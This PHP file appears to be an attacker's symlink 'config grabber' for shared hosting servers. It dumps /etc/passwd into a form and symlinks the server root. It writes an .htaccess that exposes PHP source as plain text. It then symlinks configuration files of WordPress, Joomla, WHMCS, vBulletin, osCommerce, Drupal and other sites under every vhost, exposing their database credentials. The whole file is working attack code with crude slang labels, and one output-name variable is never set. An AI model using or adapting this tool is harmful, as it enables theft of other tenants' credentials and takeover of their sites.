<?php
if($_POST['jembud']){
@mkdir("vhost_c7e", 0777);
@chdir("vhost_c7e");
system("ln -s / root");
$htaccess="
Options Indexes FollowSymLinks
DirectoryIndex ngeue.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any";
@file_put_contents(".htaccess",$htaccess);
$etcp=$_POST['passwd'];
    
$etcp=explode("\n",$etcp);
foreach($etcp as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[5];
$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
if (preg_match('/vhosts/i',$user)){
symlink('/var/www/vhosts/'.$user.'/httpdocs/includes/configure.php',$sitess.'-shop.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/os/includes/configure.php',$sitess.'-shop-os.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/oscom/includes/configure.php',$sitess.'-oscom.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/oscommerce/includes/configure.php',$sitess.'-oscommerce.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/oscommerces/includes/configure.php',$sitess.'-oscommerces.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/shop/includes/configure.php',$sitess.'-shop2.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/shopping/includes/configure.php',$sitess.'-shop-shopping.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/sale/includes/configure.php',$sitess.'-sale.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/amember/config.inc.php',$sitess.'-amember.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/config.inc.php',$sitess.'-amember2.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/members/configuration.php',$sitess.'-members.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/config.php',$sitess.'-4images1.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/forum/includes/config.php',$sitess.'-forum.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/forums/includes/config.php',$sitess.'-forums.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/admin/conf.php',$sitess.'-5.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/admin/config.php',$sitess.'-4.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/wp-config.php',$sitess.'-wp13.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/wp/wp-config.php',$sitess.'-wp13-wp.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/WP/wp-config.php',$sitess.'-wp13-WP.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/wp/beta/wp-config.php',$sitess.'-wp13-wp-beta.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/beta/wp-config.php',$sitess.'-wp13-beta.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/press/wp-config.php',$sitess.'-wp13-press.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/wordpress/wp-config.php',$sitess.'-wp13-wordpress.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/Wordpress/wp-config.php',$sitess.'-wp13-Wordpress.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/blog/wp-config.php',$sitess.'-wp13-Wordpress.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/wordpress/beta/wp-config.php',$sitess.'-wp13-wordpress-beta.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/news/wp-config.php',$sitess.'-wp13-news.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/new/wp-config.php',$sitess.'-wp13-new.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/blog/wp-config.php',$sitess.'-wp-blog.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/beta/wp-config.php',$sitess.'-wp-beta.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/blogs/wp-config.php',$sitess.'-wp-blogs.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/home/wp-config.php',$sitess.'-wp-home.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/protal/wp-config.php',$sitess.'-wp-protal.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/site/wp-config.php',$sitess.'-wp-site.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/main/wp-config.php',$sitess.'-wp-main.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/test/wp-config.php',$sitess.'-wp-test.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/arcade/functions/dbclass.php',$sitess.'-ibproarcade.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/arcade/functions/dbclass.php',$sitess.'-ibproarcade.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/joomla/configuration.php',$sitess.'-joomla2.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/protal/configuration.php',$sitess.'-joomla-protal.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/joo/configuration.php',$sitess.'-joo.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/cms/configuration.php',$sitess.'-joomla-cms.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/site/configuration.php',$sitess.'-joomla-site.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/main/configuration.php',$sitess.'-joomla-main.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/news/configuration.php',$sitess.'-joomla-news.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/new/configuration.php',$sitess.'-joomla-new.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/home/configuration.php',$sitess.'-joomla-home.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/vb/includes/config.php',$sitess.'-vb~config.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/vb3/includes/config.php',$sitess.'-vb3~config.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/cc/includes/config.php',$sitess.'-vb1~config.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/includes/config.php',$sitess.'-includes-vb.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/forum/includes/class_core.php',$sitess.'-vbluttin~class_core.php.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/vb/includes/class_core.php',$sitess.'-vbluttin~class_core.php1.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/cc/includes/class_core.php',$sitess.'-vbluttin~class_core.php2.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/whm/configuration.php',$sitess.'-whm15.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/central/configuration.php',$sitess.'-whm-central.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/whm/whmcs/configuration.php',$sitess.'-whm-whmcs.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/whm/WHMCS/configuration.php',$sitess.'-whm-WHMCS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/whmc/WHM/configuration.php',$sitess.'-whmc-WHM.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/whmcs/configuration.php',$sitess.'-whmcs.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/support/configuration.php',$sitess.'-support.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/supp/configuration.php',$sitess.'-supp.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/secure/configuration.php',$sitess.'-sucure.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/secure/whm/configuration.php',$sitess.'-sucure-whm.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/secure/whmcs/configuration.php',$sitess.'-sucure-whmcs.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/cpanel/configuration.php',$sitess.'-cpanel.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/panel/configuration.php',$sitess.'-panel.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/host/configuration.php',$sitess.'-host.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/hosting/configuration.php',$sitess.'-hosting.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/hosts/configuration.php',$sitess.'-hosts.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/configuration.php',$sitess.'-joomla.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/submitticket.php',$sitess.'-whmcs2.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/clients/configuration.php',$sitess.'-clients.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/client/configuration.php',$sitess.'-client.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/clientes/configuration.php',$sitess.'-clientes.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/cliente/configuration.php',$sitess.'-client.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/clientsupport/configuration.php',$sitess.'-clientsupport.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/billing/configuration.php',$sitess.'-billing.txt'); 
symlink('/var/www/vhosts/'.$user.'/httpdocs/manage/configuration.php',$sitess.'-whm-manage.txt'); 
symlink('/var/www/vhosts/'.$user.'/httpdocs/my/configuration.php',$sitess.'-whm-my.txt'); 
symlink('/var/www/vhosts/'.$user.'/httpdocs/myshop/configuration.php',$sitess.'-whm-myshop.txt'); 
symlink('/var/www/vhosts/'.$user.'/httpdocs/includes/dist-configure.php',$sitess.'-zencart.txt'); 
symlink('/var/www/vhosts/'.$user.'/httpdocs/zencart/includes/dist-configure.php',$sitess.'-shop-zencart.txt'); 
symlink('/var/www/vhosts/'.$user.'/httpdocs/shop/includes/dist-configure.php',$sitess.'-shop-ZCshop.txt'); 
symlink('/var/www/vhosts/'.$user.'/httpdocs/Settings.php',$sitess.'-smf.txt'); 
symlink('/var/www/vhosts/'.$user.'/httpdocs/smf/Settings.php',$sitess.'-smf2.txt'); 
symlink('/var/www/vhosts/'.$user.'/httpdocs/forum/Settings.php',$sitess.'-smf-forum.txt'); 
symlink('/var/www/vhosts/'.$user.'/httpdocs/forums/Settings.php',$sitess.'-smf-forums.txt'); 
symlink('/var/www/vhosts/'.$user.'/httpdocs/upload/includes/config.php',$sitess.'-up.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/article/config.php',$sitess.'-Nwahy.txt'); 
symlink('/var/www/vhosts/'.$user.'/httpdocs/up/includes/config.php',$sitess.'-up2.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/conf_global.php',$sitess.'-6.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/include/db.php',$sitess.'-7.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/connect.php',$sitess.'-PHP-Fusion.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/mk_conf.php',$sitess.'-9.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/includes/config.php',$sitess.'-traidnt1.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/config.php',$sitess.'-4images.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/sites/default/settings.php',$sitess.'-Drupal.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/member/configuration.php',$sitess.'-1member.txt') ; 
symlink('/var/www/vhosts/'.$user.'/httpdocs/billings/configuration.php',$sitess.'-billings.txt') ; 
symlink('/var/www/vhosts/'.$user.'/httpdocs/whm/configuration.php',$sitess.'-whm.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/supports/configuration.php',$sitess.'-supports.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/requires/config.php',$sitess.'-AM4SS-hosting.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/supports/includes/iso4217.php',$sitess.'-hostbills-supports.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/client/includes/iso4217.php',$sitess.'-hostbills-client.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/support/includes/iso4217.php',$sitess.'-hostbills-support.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/billing/includes/iso4217.php',$sitess.'-hostbills-billing.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/billings/includes/iso4217.php',$sitess.'-hostbills-billings.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/host/includes/iso4217.php',$sitess.'-hostbills-host.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/hosts/includes/iso4217.php',$sitess.'-hostbills-hosts.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/hosting/includes/iso4217.php',$sitess.'-hostbills-hosting.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/hostings/includes/iso4217.php',$sitess.'-hostbills-hostings.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/includes/iso4217.php',$sitess.'-hostbills.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/hostbills/includes/iso4217.php',$sitess.'-hostbills-hostbills.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/hostbill/includes/iso4217.php',$sitess.'-hostbills-hostbill.txt');
}
}
echo "<center><a href='vhost_c7e/root/'><u>Symlinknya</u></a><br><a href='vhost_c7e/'><u>Config Nya Njing</u></a>";
}else{
echo "<center><form method='POST' action=''>
<textarea name='passwd' rows='15' cols='60'>";
echo include("/etc/passwd");
echo "</textarea>";
echo "<br><br>";
echo "<input type='submit' name='jembud' value='gaaskeunn!!'></center>";
}
